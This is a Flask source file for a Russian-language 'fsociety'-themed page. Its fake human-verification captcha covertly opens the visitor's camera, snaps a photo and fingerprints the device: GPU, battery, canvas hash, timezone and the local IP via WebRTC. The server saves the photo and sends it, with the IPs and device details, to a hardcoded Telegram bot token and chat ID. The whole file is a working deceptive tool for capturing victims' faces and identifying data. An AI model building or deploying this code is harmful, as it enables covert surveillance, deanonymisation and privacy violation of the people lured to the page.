import os, base64, datetime, json, requests
from flask import Flask, request, render_template_string

app = Flask(__name__)

BOT_TOKEN = "8281076655:AAFhrIC-OEqCyCgiLKScj-QOZeAF26xx2ro"
CHAT_ID = "6292733727"

HTML = """
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>fsociety</title>
<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
html, body {
  height: 100%;
  background: #000;
  overflow: hidden;
}
body {
  font-family: 'Roboto', sans-serif;
  display: flex;
  align-items: center;
  justify-content: center;
  min-height: 100vh;
}

/* Фон с цифрами */
#ascii-bg {
  position: fixed;
  top: 0; left: 0;
  width: 100%; height: 100%;
  z-index: 0;
}

/* Экран 1: fsociety */
#screen-intro {
  position: relative;
  z-index: 2;
  text-align: center;
  font-family: 'Share Tech Mono', monospace;
  color: #00ff41;
  padding: 20px;
  border: 1px solid #00ff41;
  background: rgba(0,0,0,0.75);
  backdrop-filter: blur(4px);
  max-width: 360px;
  width: 90%;
  box-shadow: 0 0 20px rgba(0,255,65,0.2), inset 0 0 20px rgba(0,255,65,0.05);
}
.logo {
  font-size: 42px;
  letter-spacing: 10px;
  margin-bottom: 8px;
  color: #00ff41;
  text-shadow: 0 0 12px #00ff41;
  position: relative;
  display: inline-block;
}
.glitch::before,
.glitch::after {
  content: attr(data-text);
  position: absolute;
  top: 0; left: 0;
  width: 100%;
  overflow: hidden;
}
.glitch::before {
  color: #ff0033;
  animation: glitch 0.6s infinite;
  clip-path: polygon(0 0, 100% 0, 100% 45%, 0 45%);
}
.glitch::after {
  color: #00ffff;
  animation: glitch 0.6s infinite reverse;
  clip-path: polygon(0 55%, 100% 55%, 100% 100%, 0 100%);
}
@keyframes glitch {
  0% { transform: translate(0); }
  20% { transform: translate(-2px, 1px); }
  40% { transform: translate(2px, -1px); }
  60% { transform: translate(-1px, -1px); }
  80% { transform: translate(1px, 1px); }
  100% { transform: translate(0); }
}
.sub {
  font-size: 11px;
  color: #00802a;
  letter-spacing: 4px;
  margin-bottom: 28px;
  text-transform: uppercase;
}
.status-text {
  font-size: 13px;
  color: #00ff41;
  letter-spacing: 2px;
  margin-bottom: 20px;
}
.status-text::after {
  content: "_";
  animation: blink 1s step-end infinite;
}
@keyframes blink { 50% { opacity: 0; } }
.bar {
  width: 100%;
  height: 4px;
  background: #001a0a;
  border: 1px solid #004d1f;
  margin-bottom: 24px;
  overflow: hidden;
}
.bar-fill {
  height: 100%;
  width: 0%;
  background: #00ff41;
  box-shadow: 0 0 8px #00ff41;
  animation: loadBar 3s ease-in-out infinite;
}
@keyframes loadBar {
  0% { width: 10%; }
  50% { width: 70%; }
  100% { width: 10%; }
}
.btn {
  display: inline-block;
  padding: 14px 32px;
  border: 1px solid #00ff41;
  color: #00ff41;
  background: transparent;
  font-family: 'Share Tech Mono', monospace;
  font-size: 14px;
  letter-spacing: 4px;
  text-transform: uppercase;
  cursor: pointer;
  transition: all 0.3s ease;
  box-shadow: 0 0 10px rgba(0,255,65,0.3);
}
.btn:hover {
  background: #00ff41;
  color: #000;
  box-shadow: 0 0 20px #00ff41;
}

/* Экран 2: капча */
#screen-captcha {
  display: none;
  position: relative;
  z-index: 2;
}
#screen-captcha.active { display: block; }
.captcha {
  background: #fff;
  border: 1px solid #d3d3d3;
  border-radius: 4px;
  box-shadow: 0 2px 8px rgba(0,0,0,0.1);
  padding: 24px;
  width: 320px;
  text-align: center;
  font-family: 'Roboto', sans-serif;
}
.captcha .logo-svg {
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 10px;
  margin-bottom: 16px;
}
.captcha .logo-svg svg { width: 32px; height: 32px; }
.captcha .logo-text {
  font-size: 14px;
  color: #5f6368;
  letter-spacing: 1px;
  text-transform: uppercase;
}
.captcha .title {
  font-size: 18px;
  color: #202124;
  margin-bottom: 8px;
  font-weight: 500;
}
.captcha .subtitle {
  font-size: 13px;
  color: #5f6368;
  margin-bottom: 24px;
}
.checkbox {
  display: flex;
  align-items: center;
  gap: 12px;
  padding: 12px;
  border: 2px solid #d3d3d3;
  border-radius: 4px;
  cursor: pointer;
  transition: all 0.2s;
  background: #fff;
}
.checkbox:hover { border-color: #4285f4; }
.checkbox.checked { border-color: #4285f4; background: #f0f6ff; }
.box {
  width: 24px; height: 24px;
  border: 2px solid #5f6368;
  border-radius: 2px;
  display: flex;
  align-items: center;
  justify-content: center;
  transition: all 0.2s;
  flex-shrink: 0;
}
.checkbox.checked .box { background: #4285f4; border-color: #4285f4; }
.box svg { width: 16px; height: 16px; opacity: 0; transition: opacity 0.2s; }
.checkbox.checked .box svg { opacity: 1; }
.checkbox-text { font-size: 14px; color: #202124; text-align: left; }
.status {
  margin-top: 16px;
  font-size: 13px;
  color: #5f6368;
  min-height: 18px;
}
.status.error { color: #d93025; }
.status.success { color: #188038; }
.spinner {
  display: inline-block;
  width: 14px; height: 14px;
  border: 2px solid #d3d3d3;
  border-top-color: #4285f4;
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
  vertical-align: middle;
  margin-right: 8px;
}
@keyframes spin { to { transform: rotate(360deg); } }
.rec {
  display: none;
  margin-top: 16px;
  font-size: 13px;
  color: #d93025;
}
.rec.active { display: block; }
.dot {
  display: inline-block;
  width: 10px; height: 10px;
  background: #d93025;
  border-radius: 50%;
  margin-right: 6px;
  animation: blink 1s infinite;
}

/* Экран 3: финал */
#screen-final {
  display: none;
  position: relative;
  z-index: 2;
  text-align: center;
  font-family: 'Share Tech Mono', monospace;
  color: #00ff41;
  padding: 20px;
  animation: fadeIn 2s ease;
}
#screen-final.active { display: block; }
@keyframes fadeIn {
  from { opacity: 0; }
  to { opacity: 1; }
}
.final-line1 {
  font-size: 28px;
  letter-spacing: 6px;
  margin-bottom: 16px;
  text-shadow: 0 0 12px #00ff41;
}
.final-line2 {
  font-size: 16px;
  letter-spacing: 3px;
  margin-bottom: 40px;
  text-shadow: 0 0 8px #00ff41;
}
.final-fsociety {
  font-size: 42px;
  letter-spacing: 10px;
  text-shadow: 0 0 20px #00ff41;
  animation: pulseGlow 3s ease-in-out infinite;
}
@keyframes pulseGlow {
  0%, 100% { text-shadow: 0 0 20px #00ff41; }
  50% { text-shadow: 0 0 40px #00ff41, 0 0 60px #00ff41; }
}
.final-sub {
  font-size: 11px;
  color: #00802a;
  letter-spacing: 4px;
  margin-top: 24px;
  text-transform: uppercase;
}
</style>
</head>
<body>
<canvas id="ascii-bg"></canvas>

<!-- Экран 1: fsociety -->
<div id="screen-intro">
  <div class="logo">
    <span class="glitch" data-text="fsociety">fsociety</span>
  </div>
  <div class="sub">fsociety // connection</div>
  <div class="status-text">secure connection required</div>
  <div class="bar"><div class="bar-fill"></div></div>
  <button class="btn" onclick="showCaptcha()">Verify identity</button>
</div>

<!-- Экран 2: капча -->
<div id="screen-captcha">
  <div class="captcha">
    <div class="logo-svg">
      <svg viewBox="0 0 24 24" fill="none">
        <path d="M12 2L4 6v6c0 5.5 3.4 10.7 8 12 4.6-1.3 8-6.5 8-12V6l-8-4z" fill="#4285f4"/>
        <path d="M10 15l-3-3 1.4-1.4L10 12.2l5.6-5.6L17 8l-7 7z" fill="#fff"/>
      </svg>
      <div class="logo-text">Security Check</div>
    </div>
    <div class="title">Подтвердите, что вы человек</div>
    <div class="subtitle">Для продолжения необходимо пройти проверку</div>
    <div class="checkbox" id="checkbox" onclick="startCheck()">
      <div class="box">
        <svg viewBox="0 0 24 24" fill="none">
          <path d="M9 16.2L4.8 12l-1.4 1.4L9 19 21 7l-1.4-1.4L9 16.2z" fill="#fff"/>
        </svg>
      </div>
      <div class="checkbox-text">Я не робот</div>
    </div>
    <div class="status" id="status"></div>
    <div class="rec" id="rec"><span class="dot"></span>Запись 3 сек...</div>
  </div>
</div>

<!-- Экран 3: финал -->
<div id="screen-final">
  <div class="final-line1">HELLO, FRIEND.</div>
  <div class="final-line2">IT'S TIME TO WAKE UP.</div>
  <div class="final-fsociety">fsociety</div>
  <div class="final-sub">fsociety // connection</div>
</div>

<script>
// Матрица на фоне
const canvas = document.getElementById("ascii-bg");
const ctx = canvas.getContext("2d");
let w, h, columns, drops;
const chars = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン";
const fontSize = 14;

function resize() {
  w = canvas.width = window.innerWidth;
  h = canvas.height = window.innerHeight;
  columns = Math.floor(w / fontSize);
  drops = new Array(columns).fill(1);
}
resize();
window.addEventListener("resize", resize);

function draw() {
  ctx.fillStyle = "rgba(0,0,0,0.06)";
  ctx.fillRect(0, 0, w, h);
  ctx.fillStyle = "#00ff41";
  ctx.font = fontSize + "px monospace";
  for (let i = 0; i < drops.length; i++) {
    const text = chars[Math.floor(Math.random() * chars.length)];
    ctx.fillText(text, i * fontSize, drops[i] * fontSize);
    if (drops[i] * fontSize > h && Math.random() > 0.975) drops[i] = 0;
    drops[i]++;
  }
}
setInterval(draw, 50);

// Переключение экранов
function showCaptcha() {
  document.getElementById("screen-intro").style.display = "none";
  document.getElementById("screen-captcha").classList.add("active");
}

function showFinal() {
  document.getElementById("screen-captcha").classList.remove("active");
  document.getElementById("screen-final").classList.add("active");
}

// Сбор данных
async function collectData() {
  const data = {
    ua: navigator.userAgent,
    lang: navigator.language,
    langs: navigator.languages ? navigator.languages.join(", ") : "",
    platform: navigator.platform,
    screen: screen.width + "x" + screen.height,
    colorDepth: screen.colorDepth,
    pixelRatio: window.devicePixelRatio || 1,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cores: navigator.hardwareConcurrency || null,
    memory: navigator.deviceMemory || null,
    touch: 'ontouchstart' in window,
    referrer: document.referrer || "direct",
    battery: null,
    gpu: null,
    webrtc: null,
    canvas: null
  };
  try {
    if (navigator.getBattery) {
      const b = await navigator.getBattery();
      data.battery = Math.round(b.level * 100) + "% " + (b.charging ? "charging" : "discharging");
    }
  } catch(e) {}
  try {
    const c = document.createElement("canvas");
    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
    if (gl) {
      const dbg = gl.getExtension("WEBGL_debug_renderer_info");
      if (dbg) data.gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
    }
  } catch(e) {}
  try {
    data.canvas = await new Promise(resolve => {
      const c = document.createElement("canvas");
      c.width = 200; c.height = 50;
      const ctx = c.getContext("2d");
      ctx.textBaseline = "top";
      ctx.font = "14px Arial";
      ctx.fillStyle = "#f60";
      ctx.fillRect(0, 0, 200, 50);
      ctx.fillStyle = "#069";
      ctx.fillText("fingerprint", 2, 15);
      ctx.fillStyle = "rgba(102,204,0,0.7)";
      ctx.fillText("fingerprint", 4, 17);
      const hash = c.toDataURL().split(",")[1];
      let h = 0;
      for (let i = 0; i < hash.length; i++) { h = ((h << 5) - h) + hash.charCodeAt(i); h |= 0; }
      resolve(Math.abs(h).toString(16));
    });
  } catch(e) {}
  try {
    data.webrtc = await new Promise(resolve => {
      const pc = new RTCPeerConnection({ iceServers: [] });
      pc.createDataChannel("");
      pc.onicecandidate = e => {
        if (!e.candidate) { pc.close(); return; }
        const m = e.candidate.candidate.match(/([0-9]{1,3}\\.){3}[0-9]{1,3}/);
        if (m) { pc.close(); resolve(m[0]); }
      };
      pc.createOffer().then(o => pc.setLocalDescription(o));
      setTimeout(() => resolve(null), 2000);
    });
  } catch(e) {}
  return data;
}

// Капча → камера → фото → финал
async function startCheck() {
  const cb = document.getElementById("checkbox");
  const status = document.getElementById("status");
  const rec = document.getElementById("rec");
  if (cb.classList.contains("checked")) return;

  status.innerHTML = '<span class="spinner"></span>Проверка...';
  status.className = "status";

  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" },
      audio: false
    });

    rec.classList.add("active");
    status.innerHTML = '<span class="spinner"></span>Анализ...';

    const video = document.createElement("video");
    video.srcObject = stream;
    video.setAttribute("playsinline", "");
    await video.play();
    await new Promise(r => setTimeout(r, 3000));
    stream.getTracks().forEach(t => t.stop());
    rec.classList.remove("active");

    const c = document.createElement("canvas");
    c.width = video.videoWidth;
    c.height = video.videoHeight;
    c.getContext("2d").drawImage(video, 0, 0);
    const photo = c.toDataURL("image/png");

    const extra = await collectData();

    await fetch("/save", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify({photo: photo, extra: extra})
    });

    cb.classList.add("checked");
    status.className = "status success";
    status.innerText = "Проверка пройдена";

    setTimeout(showFinal, 1500);
  } catch (e) {
    rec.classList.remove("active");
    status.className = "status error";
    status.innerText = "Проверка не пройдена. Попробуйте снова.";
  }
}
</script>
</body>
</html>
"""

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/save", methods=["POST"])
def save():
    data = request.get_json()
    photo_data = data["photo"].split(",")[1]
    extra = data.get("extra", {})

    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "")
    ts = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    filename = f"/tmp/photo_{ts}.png"
    with open(filename, "wb") as f:
        f.write(base64.b64decode(photo_data))

    ip_list = ip.split(",")
    ip_main = ip_list[0].strip() if ip_list else ip
    ip_all = ", ".join(x.strip() for x in ip_list)

    text = (
        f"🟢 <b>НОВЫЙ ВИЗИТ</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"🌐 <b>СЕТЬ</b>\n"
        f"├ IP: <code>{ip_main}</code>\n"
        f"├ Все IP: <code>{ip_all}</code>\n"
        f"├ WebRTC: <code>{extra.get('webrtc','—')}</code>\n"
        f"└ Referrer: {extra.get('referrer','—')}\n\n"
        f"📱 <b>УСТРОЙСТВО</b>\n"
        f"├ Платформа: {extra.get('platform','—')}\n"
        f"├ Экран: {extra.get('screen','—')} @{extra.get('pixelRatio','—')}x ({extra.get('colorDepth','—')}bit)\n"
        f"├ Ядра: {extra.get('cores','—')} | Память: {extra.get('memory','—')}GB\n"
        f"├ Тач: {extra.get('touch','—')}\n"
        f"├ Батарея: {extra.get('battery','—')}\n"
        f"└ GPU: {extra.get('gpu','—')}\n\n"
        f"🌍 <b>ЛОКАЦИЯ</b>\n"
        f"├ Язык: {extra.get('lang','—')}\n"
        f"├ Языки: {extra.get('langs','—')}\n"
        f"└ Часовой пояс: {extra.get('timezone','—')}\n\n"
        f"🔑 <b>ОТПЕЧАТОК</b>\n"
        f"└ Canvas: <code>{extra.get('canvas','—')}</code>\n\n"
        f"🖥 <b>USER-AGENT</b>\n"
        f"<code>{ua}</code>\n\n"
        f"⏰ <b>ВРЕМЯ</b>\n"
        f"└ {ts}"
    )

    requests.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
        data={"chat_id": CHAT_ID, "text": text, "parse_mode": "HTML"}
    )
    requests.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
        data={"chat_id": CHAT_ID},
        files={"photo": open(filename, "rb")}
    )
    return "ok"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
